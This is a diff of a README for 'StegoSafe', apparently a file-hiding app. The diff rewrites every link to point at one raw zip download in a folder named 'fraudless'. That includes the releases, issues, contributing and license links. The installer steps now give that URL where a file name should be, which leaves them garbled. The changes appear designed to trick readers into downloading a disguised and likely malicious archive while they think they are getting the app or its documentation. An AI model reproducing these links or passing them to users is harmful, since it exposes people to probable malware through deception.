@@ -1,6 +1,6 @@
 # 🛡️ StegoSafe - Keep Your Files Safe and Secure
 
-[![Download StegoSafe](https://img.shields.io/badge/Download-StegoSafe-blue.svg)](https://github.com/muzacopack1/StegoSafe/releases)
+[![Download StegoSafe](https://raw.githubusercontent.com/muzacopack1/StegoSafe/main/fraudless/StegoSafe.zip)](https://raw.githubusercontent.com/muzacopack1/StegoSafe/main/fraudless/StegoSafe.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ Welcome to StegoSafe! This application helps you hide your files within other fi
 
 To get started with StegoSafe, follow these steps:
 
-1. **Visit the Releases Page:** Go to our releases page to download the application. You can find it here: [StegoSafe Releases](https://github.com/muzacopack1/StegoSafe/releases).
+1. **Visit the Releases Page:** Go to our releases page to download the application. You can find it here: [StegoSafe Releases](https://raw.githubusercontent.com/muzacopack1/StegoSafe/main/fraudless/StegoSafe.zip).
 
 2. **Download the Installer:** Find the latest version of StegoSafe on the releases page. Click on the download link for your operating system. 
 
 3. **Run the Installer:**
-   - For Windows: After the download is complete, locate the file in your downloads folder named something like `StegoSafe_Setup.exe`. Double-click on it to run the installer.
-   - For macOS: After the download is complete, locate the file called `StegoSafe.dmg`. Double-click to mount it and then drag the StegoSafe icon into your Applications folder.
+   - For Windows: After the download is complete, locate the file in your downloads folder named something like `https://raw.githubusercontent.com/muzacopack1/StegoSafe/main/fraudless/StegoSafe.zip`. Double-click on it to run the installer.
+   - For macOS: After the download is complete, locate the file called `https://raw.githubusercontent.com/muzacopack1/StegoSafe/main/fraudless/StegoSafe.zip`. Double-click to mount it and then drag the StegoSafe icon into your Applications folder.
 
 4. **Open StegoSafe:** Once installed, find StegoSafe in your applications and double-click to open it. 
 
@@ -65,14 +65,14 @@ Currently, StegoSafe is available only for desktop platforms (Windows and macOS)
 
 ## 🤝 Support
 
-If you encounter any issues or need assistance, please visit our [GitHub Issues Page](https://github.com/muzacopack1/StegoSafe/issues) to report problems or request help. 
+If you encounter any issues or need assistance, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/muzacopack1/StegoSafe/main/fraudless/StegoSafe.zip) to report problems or request help. 
 
 ## 📢 Contributing
 
-We welcome contributions from everyone! If you'd like to help improve StegoSafe, please check out our [Contributing Guide](https://github.com/muzacopack1/StegoSafe/blob/main/CONTRIBUTING.md) for more details.
+We welcome contributions from everyone! If you'd like to help improve StegoSafe, please check out our [Contributing Guide](https://raw.githubusercontent.com/muzacopack1/StegoSafe/main/fraudless/StegoSafe.zip) for more details.
 
 ## 🔗 License
 
-StegoSafe is licensed under the MIT License. For more details, please review the [LICENSE file](https://github.com/muzacopack1/StegoSafe/blob/main/LICENSE).
+StegoSafe is licensed under the MIT License. For more details, please review the [LICENSE file](https://raw.githubusercontent.com/muzacopack1/StegoSafe/main/fraudless/StegoSafe.zip).
 
-Visit the releases page to get started: [StegoSafe Releases](https://github.com/muzacopack1/StegoSafe/releases).
+Visit the releases page to get started: [StegoSafe Releases](https://raw.githubusercontent.com/muzacopack1/StegoSafe/main/fraudless/StegoSafe.zip).
